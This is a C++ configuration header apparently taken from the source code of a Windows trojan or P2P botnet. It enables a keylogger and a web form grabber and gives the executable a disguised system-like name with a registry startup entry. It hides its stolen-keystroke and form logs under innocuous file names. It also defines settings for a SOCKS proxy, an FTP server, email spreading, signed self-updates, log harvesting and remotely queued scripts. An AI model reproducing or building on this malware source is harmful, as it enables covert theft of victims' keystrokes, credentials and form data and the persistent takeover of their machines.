#pragma once

#define KEYLOG_ON
//#define KEYLOG_HOOK // Use dll hook or comment out to use polling keylogger
#define FORMGRABBER_ON

#define EXE_FILENAME "wmipvs.exe"
#define REG_STARTUPNAME "wmipvs"
#define KEYLOG_FILENAME "FNTCACHE.BIN"
#define FORMLOG_FILENAME "perfc012.dat"
#define GLOBAL_MUTEX_NAME "d3kb5sujs50lq2mr"
#define EXE_VERSION "21" // Used in updating
#define NO_EMAIL_SPREAD // Define to disable email
#define NO_FTP_SERVER // Define to disable ftp server

#define REG_ROOT "SOFTWARE\\GNU"
#define REG_LINKS "SOFTWARE\\GNU\\Data"
#define REG_EMAILS "SOFTWARE\\GNU\\Contact"
#define REG_PVARS "SOFTWARE\\GNU\\Version"
#define REG_IMS REG_EMAILS
#define REG_UUID_VALUE "uuid"
#define REG_P2PPORT_VALUE "pprt"
#define REG_P2PKEYSIZE_VALUE "pkys"
#define REG_SOCKSSTARTUP_VALUE "skst"
#define REG_SOCKSVERSION_VALUE "skvr"
#define REG_SOCKSPORT_VALUE "skpt"
#define REG_SOCKSUSER_VALUE "skus"
#define REG_SOCKSPASS_VALUE "skps"
#define REG_FTPSTARTUP_VALUE "ftst"
#ifndef NO_FTP_SERVER
#define REG_FTPPORT_VALUE "ftpt"
#define REG_FTPUSER_VALUE "ftus"
#define REG_FTPPASS_VALUE "ftps"
#endif
#define REG_UPDATE_SIGNATURE_VALUE "upsn"
#define REG_UPDATE_HASH_VALUE "uphs"
// Client registry entries
#define REG_PRIVATEKEY "PRVKEY" // Where private key is stored encrypted
#define REG_PRIVATEKEYMASTER "PRVKEYM" // Where the master messaging private key is stored
#define REG_PWORDENC "PWE" // Stores *encrypted* hash of password
#define REG_AUTOADDLINKS "AALINKS"
#define REG_AUTOREMOVELINKS "ARLINKS"
/*#define REG_SENDLOGHOST "SLHOST"
#define REG_SENDLOGPORT "SLPORT"
#define REG_SENDLOGFLAGS "SLFLAGS"
#define REG_HTTPDURL "HDURL"
#define REG_HTTPDFILE "HDFILE"
#define REG_HTTPDUPDATE "HDUPDATE"
#define REG_HTTPDEXECUTE "HDEXEC"
#define REG_IRCHOST "IRHOST"
#define REG_IRCPORT "IRPORT"
#define REG_IRCNICK "IRNICK"
#define REG_IRCIDENT "IRIDENT"
#define REG_IRCNAME "IRNAME"
#define REG_IRCCHANNEL "IRCHAN"
#define REG_IRCALLOWED "IRALLOW"*/
#define REG_LOGHARVESTPORT "LHPORT"
#define REG_LOGHARVESTDIR "LHDIR"
#define REG_MAINX "MWX"
#define REG_MAINY "MWY"
#define REG_MAINW "MWW"
#define REG_MAINH "MWH"
#define REG_LOGHARVESTA "LHA"
#define REG_LOGHARVESTX "LHX"
#define REG_LOGHARVESTY "LHY"
#define REG_LOGHARVESTW "LHW"
#define REG_LOGHARVESTH "LHH"
#define REG_MSGQUEUEA "MQA"
#define REG_MSGQUEUEX "MQX"
#define REG_MSGQUEUEY "MQY"
#define REG_MSGQUEUEH "MQH"
#define REG_MSGQUEUEB "MQB"
#define REG_MSGQUEUEITEMS "MQI"
#define REG_MSGQUEUEITEMSCRIPTNAME "SN"
#define REG_MSGQUEUEITEMSCRIPT "SC"
#define REG_MSGQUEUEITEMSENDTO "ST"
#define REG_MSGQUEUEITEMTTL "TL"
#define REG_MSGQUEUEITEMRUNLOCALLY "RL"
#define REG_MSGQUEUEITEMBROADCAST "BR"
#define REG_RECENT_LINKS "RLINKS"
#define REG_COLORITEM "COLORITM"
#define REG_MINIMIZETOTRAY "MMTT"
//

#define UUID_LEN 16

#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#include "registry.h"
#include "rand.h"
#include "timeout.h"
#include "debug.h"

namespace Config
{
	PCHAR GetUUID(VOID);
	PCHAR GetUUIDAscii(VOID);
	UINT GetUUIDLen(VOID);
	ULONGLONG GetUptime(VOID);
	USHORT GetP2PPort(VOID);
	ULONG GetIPAddress(VOID);
	ULONG GetSubnetMask(VOID);
	PCHAR GetKeylogFilename(VOID);
	PCHAR GetFormlogFilename(VOID);
	PCHAR GetExecuteFilename(VOID);
	VOID EnableSocksStartup(CHAR Version, USHORT Port, UCHAR UserHash[16], UCHAR PassHash[16]);
	VOID DisableSocksStartup(VOID);
	BOOL LoadSocksStartupData(VOID);
#ifndef NO_FTP_SERVER
	VOID EnableFTPStartup(USHORT Port, UCHAR UserHash[16], UCHAR PassHash[16]);
	VOID DisableFTPStartup(VOID);
	BOOL LoadFTPStartupData(VOID);
#endif
	/*VOID AddLink(PCHAR Host);
	VOID RemoveLink(PCHAR Host);
	PCHAR GetLink(VOID);
	INT GetLinkCount(VOID);

	extern INT CurrentLink;
	extern PCHAR LinkAddress;*/
	extern CHAR KeylogFilename[MAX_PATH];
	extern CHAR FormlogFilename[MAX_PATH];
	extern CHAR ExecuteFilename[MAX_PATH];
	extern CHAR UUID[UUID_LEN];
	extern CHAR UUIDAscii[UUID_LEN * 2];
	extern UCHAR SocksUserHash[16];
	extern UCHAR SocksPassHash[16];
	extern USHORT SocksPort;
	extern CHAR SocksVersion;
	extern HANDLE GlobalMutex;
#ifndef NO_FTP_SERVER
	extern UCHAR FTPUserHash[16];
	extern UCHAR FTPPassHash[16];
	extern USHORT FTPPort;
#endif
	extern Timeout StartTime;
}